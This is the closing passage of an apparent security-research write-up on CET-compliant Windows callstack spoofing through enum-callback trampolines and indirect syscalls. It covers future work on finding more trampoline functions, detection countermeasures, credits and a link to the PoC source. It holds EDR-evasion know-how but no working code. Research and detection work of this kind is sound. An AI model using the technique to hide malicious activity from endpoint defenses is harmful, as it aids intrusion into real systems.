| **Enum function** | Single (`EnumSystemLocalesEx`) | Random from 39-function basket |
| **Trampoline search** | Scan target `Zw` function only | Scan any `ntdll` function |
| **Error handling** | Minimal | Robust |
| **Strings** | Plaintext in binary | Encrypted / obfuscated |

### 9.2 This Is NOT a Weapon

Let me be very direct: this PoC would not survive a basic static analysis by any halfway decent EDR. It has plaintext API name strings in the binary. It uses `GetModuleHandleW` and `GetProcAddress` for function resolution, which are heavily monitored. There's no string obfuscation, no anti-analysis, nothing.

This is intentional. The point is to demonstrate that CET-compliant callstack spoofing via enum callback trampolining is feasible, not to provide a ready-to-use, undetectable implant.

If you're a blue teamer reading this, the PoC in its current form is trivially detectable. The value of this research is in understanding the technique so you can build defenses against more sophisticated implementations.

---

## 10. Future Work

The most natural next step is expanding the pool of usable trampoline functions.

The requirements for a candidate function are:

1. It must accept a **callback function pointer** as one of its parameters
2. It must **call the callback at least once** during normal execution
3. It must **stop when the callback returns 0**, so that a successful `syscall` (returning `STATUS_SUCCESS` = 0) cleanly terminates it
4. It must live in a **module loaded by default** (`kernel32.dll`, `kernelbase.dll`, `ntdll.dll`), because loading other modules is detectable

A systematic audit of all callback-accepting functions in these three DLLs would probably turn up more candidates beyond the 39 I found. The more functions in the basket, the harder it is for EDRs to build signatures based on which function appears on the stack.

---

## 11. Detection and Countermeasures

The technique produces a clean-looking stack, but it's not invisible. This section is for the defensive side.

### 11.1 TEB ArbitraryUserPointer Monitoring

The technique writes to `TEB+0x28`. Monitoring writes to this field (hardware watchpoints, periodic sampling) could flag suspicious values, especially pointers to stack memory matching the `EmbeddedContext` layout.

### 11.2 Shadow Stack vs. Normal Stack Divergence

On CET systems, between the `jmp` and the eventual `ret` in the trampoline, the two stacks are temporarily out of sync. A kernel-mode monitor that reads both during the `syscall` trap could catch this.

### 11.3 Heuristic Call Stack Analysis

`NtProtectVirtualMemory` being called from inside `Internal_EnumSystemLocales` is not normal. EDRs could whitelist "expected" `syscall` call chains and flag deviations. Machine learning models trained on normal stacks could spot anomalies.

### 11.4 Enum Callback Behavioral Analysis

Callbacks that fire during thread pool work items (unusual for locale enumeration) or that coincide with sensitive syscalls could be flagged.

### 11.5 Thread Pool Work Item Profiling

`SubmitThreadpoolWork` immediately followed by `WaitForThreadpoolWorkCallbacks` with very short execution times is unusual for legitimate async work.

### 11.6 `INCSSPQ` Instruction Monitoring

`INCSSPQ`/`INCSSPD` are rarely used in normal code. Performance counters or instruction traces flagging frequent use could indicate shadow stack manipulation.

---

## 12. Conclusion

I presented a callstack spoofing technique that combines thread pool execution, enum callback trampolining, and indirect syscalls into a chain that produces a fully legitimate call stack at the moment of `syscall` execution.

The main contribution is the CET compliance mechanism: shadow stack reconciliation via `RDSSPQ`/`INCSSPQ` combined with a `jmp`-based context switch. This makes the technique work on CET-enabled hardware without touching unwind metadata.

The individual components are not new. I combined existing primitives, added CET compliance, and then spent a significant amount of time making sure nothing crashes (spoiler: it crashed a lot).

I hope this is useful to both offensive researchers dealing with CET and defensive teams building detection. If you build a detector for this, let me know. I'd genuinely like to see it.

**Source Code:** [https://github.com/MrTiz/CET-Enum-CallStack-Spoofer](https://github.com/MrTiz/CET-Enum-CallStack-Spoofer)

---

## 13. Prior Art and Acknowledgments

This work builds on research by people far more talented than me. I want to give proper credit:

| Project | Author(s) | Link |
|---|---|---|
| **SilentMoonwalk** | klezVirus (Alessandro Magnosi) | [GitHub](https://github.com/klezVirus/SilentMoonwalk) |
| **BYOUD** (Bring Your Own Unwind Data) | klezVirus | [GitHub](https://github.com/klezVirus/BYOUD) |
| **ThreadStackSpoofer** | mgeeky (Mariusz Banach) | [GitHub](https://github.com/mgeeky/ThreadStackSpoofer) |
| **Unwinder** | Kudaes | [GitHub](https://github.com/Kudaes/Unwinder) |
| **LoudSunRun** | susMdT | [GitHub](https://github.com/susMdT/LoudSunRun) |
| **VulcanRaven** | WithSecure Labs | [GitHub](https://github.com/WithSecureLabs/CallStackSpoofer) |
| **SysWhispers** | @jthuraisamy | [GitHub](https://github.com/jthuraisamy/SysWhispers) |
| **SysWhispers2** | @jthuraisamy | [GitHub](https://github.com/jthuraisamy/SysWhispers2) |
| **SysWhispers3** | klezVirus | [GitHub](https://github.com/klezVirus/SysWhispers3) |
| **Hell's Gate** | am0nsec, smelly\_\_vx | [GitHub](https://github.com/am0nsec/HellsGate) |
| **Halo's Gate** | Sektor7 | [Blog](https://blog.sektor7.net/#!res/2021/halosgate.md) |
| **Tartarus' Gate** | trickster0 | [GitHub](https://github.com/trickster0/TartarusGate) |
| **Indirect Syscalls** | @modexpblog (MDSec) | [Blog](https://www.mdsec.co.uk/2020/12/bypassing-user-mode-hooks-and-direct-invocation-of-system-calls-for-red-teams/) |

Research by Elastic Security Labs ([call stack detection blog](https://www.elastic.co/security-labs/peeling-back-the-curtain-with-call-stacks)), Yarden Shafir & Alex Ionescu ([CET internals](https://windows-internals.com/cet-on-windows/)), Bill Demirkapi ([CET exploitation](https://billdemirkapi.me/abusing-exceptions-for-code-execution-part-2/)), taintedbits.com ([shadow stack mechanics](https://taintedbits.com/)), and Synacktiv ([CET bypasses](https://www.synacktiv.com/publications)) was also very helpful for understanding the hardware constraints.

---

## 14. References

1. Intel 64 and IA-32 Architectures Software Developer's Manual, Volume 1, Chapter 18: *Control-flow Enforcement Technology (CET)*.
2. Microsoft Documentation: [RtlVirtualUnwind](https://learn.microsoft.com/en-us/windows/win32/api/winnt/nf-winnt-rtlvirtualunwind).
3. Microsoft Documentation: [EnumSystemLocalesEx](https://learn.microsoft.com/en-us/windows/win32/api/winnls/nf-winnls-enumsystemlocalesex).
4. Microsoft Documentation: [Thread Pool API](https://learn.microsoft.com/en-us/windows/win32/procthread/thread-pool-api).
5. Microsoft Documentation: [x64 calling convention](https://learn.microsoft.com/en-us/cpp/build/x64-calling-convention).
6. Microsoft PE/COFF Specification: Exception Handling Tables (`.pdata`, `.xdata`).
7. Elastic Security Labs: [Peeling back the curtain with call stacks](https://www.elastic.co/security-labs/peeling-back-the-curtain-with-call-stacks) (2023).
8. `windows-sys` Rust crate: [crates.io](https://crates.io/crates/windows-sys).
